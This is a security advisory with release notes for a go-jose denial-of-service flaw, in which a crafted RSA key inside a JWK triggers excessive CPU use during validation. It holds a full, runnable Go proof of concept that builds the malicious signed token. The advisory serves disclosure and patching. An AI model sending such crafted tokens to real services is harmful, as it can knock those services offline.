### Go JOSE: DoS when parsing JWKs that contain RSA keys
[CVE-2026-116587](https://nvd.nist.gov/vuln/detail/CVE-2026-116587) / [GHSA-mgcc-cww5-fp2q](https://redirect.github.com/advisories/GHSA-mgcc-cww5-fp2q)

<details>
<summary>More information</summary>

#### Details
##### Summary

A crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.

##### Details

go-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.

https://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700

##### Proof of concept

No special configuration of go-jose is required to reproduce this vulnerability.

```go
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"time"

	"github.com/go-jose/go-jose/v4"
)

func main() {
	// The RSA parameters can be complete junk. The CPU cost is in validating them.
	primeBits := 16384
	p := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))
	p.SetBit(p, 0, 1)
	n := new(big.Int).Lsh(big.NewInt(1), 2048)
	e := big.NewInt(65537)
	d := big.NewInt(3)
	q := big.NewInt(3)

	jwk := map[string]string{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(n.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(e.Bytes()),
		"d":   base64.RawURLEncoding.EncodeToString(d.Bytes()),
		"p":   base64.RawURLEncoding.EncodeToString(p.Bytes()),
		"q":   base64.RawURLEncoding.EncodeToString(q.Bytes()),
	}

	protected := map[string]any{
		"alg": "RS256",
		"jwk": jwk,
	}
	protJSON, _ := json.Marshal(protected)

	jws := map[string]string{
		"protected": base64.RawURLEncoding.EncodeToString(protJSON),
		"payload":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),
		"signature": base64.RawURLEncoding.EncodeToString([]byte("not-a-real-signature")),
	}
	jwsJSON, _ := json.Marshal(jws)

	start := time.Now()
	_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})
	elapsed := time.Since(start)

	fmt.Printf("prime bits: %d\n", primeBits)
	fmt.Printf("parse time: %s\n", elapsed)
	fmt.Printf("parse error: %v\n", err)
}
```

##### Impact

Denial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.

##### Credits

Reported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

### Release Notes

<details>
<summary>go-jose/go-jose (github.com/go-jose/go-jose/v4)</summary>

### [`v4.1.6`](https://redirect.github.com/go-jose/go-jose/releases/tag/v4.1.6)

[Compare Source](https://redirect.github.com/go-jose/go-jose/compare/v4.1.5...v4.1.6)

#### Fixed Security Issues

This release contains a fix for <https://github.com/go-jose/go-jose/security/advisories/GHSA-mgcc-cww5-fp2q>

#### Breaking Changes

The fix for <https://github.com/go-jose/go-jose/security/advisories/GHSA-mgcc-cww5-fp2q> involves capping the size of the RSA modulus of keys accepted by JWK parsing. This limit is 4096 bits. If you need this to be higher, set `MaxRSAModulusBits` before performing any JWK parsing.

#### Changed

- Reject mismatched JWE CEK lengths by [@​akshithg](https://redirect.github.com/akshithg) in [#​266](https://redirect.github.com/go-jose/go-jose/pull/266)
- Add a tests containerfile and threat model by [@​mcpherrinm](https://redirect.github.com/mcpherrinm) in [#​300](https://redirect.github.com/go-jose/go-jose/pull/300)
- Fix error message for future issued tokens by [@​inahga](https://redirect.github.com/inahga) in [#​303](https://redirect.github.com/go-jose/go-jose/pull/303)

**Full Changelog**: <https://github.com/go-jose/go-jose/compare/v4.1.5...v4.1.6>

</details>
